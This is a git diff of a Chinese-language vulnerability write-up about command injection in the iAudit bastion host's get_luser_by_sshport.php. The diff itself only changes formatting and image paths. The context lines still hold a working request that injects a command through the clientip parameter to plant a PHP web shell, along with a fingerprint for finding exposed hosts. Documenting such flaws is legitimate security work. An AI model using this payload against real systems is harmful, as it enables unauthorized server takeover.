@@ -1,8 +1,8 @@
-# 中远麒麟 iAudit堡垒机 get_luser_by_sshport.php 远程命令执行漏洞
+# 中远麒麟 iAudit堡垒机 get\_luser\_by\_sshport.php 远程命令执行漏洞
 
 ## 漏洞描述
 
-中远麒麟 iAudit堡垒机 get_luser_by_sshport.php文件存在命令拼接，攻击者通过漏洞可获取服务器权限
+中远麒麟 iAudit堡垒机 get\_luser\_by\_sshport.php文件存在命令拼接，攻击者通过漏洞可获取服务器权限
 
 ## 漏洞影响
 
@@ -20,9 +20,9 @@ cert.subject="Baolei"
 
 登录页面如下
 
-![image-20220525100240635](images/202205251002739.png)
+![image-20220525100240635](../.gitbook/assets/202205251002739.png)
 
-出现漏洞的文件为 get_luser_by_sshport.php
+出现漏洞的文件为 get\_luser\_by\_sshport.php
 
 ```
 <?php
@@ -56,8 +56,8 @@ Web目录默认为 `/opt/freesvr/web/htdocs/freesvr/audit/`
 https://xxx.xxx.xxx.xxx/get_luser_by_sshport.php?clientip=1;echo+%27%3C?php%20var_dump(shell_exec($_GET[cmd]));?%3E%27%3E/opt/freesvr/web/htdocs/freesvr/audit/test.php;&clientport=1
 ```
 
-![image-20220525100301367](images/202205251003398.png)
+![image-20220525100301367](../.gitbook/assets/202205251003398.png)
 
 再访问写入的文件执行命令
 
-![image-20220525100311413](images/202205251003445.png)
+![image-20220525100311413](../.gitbook/assets/202205251003445.png)
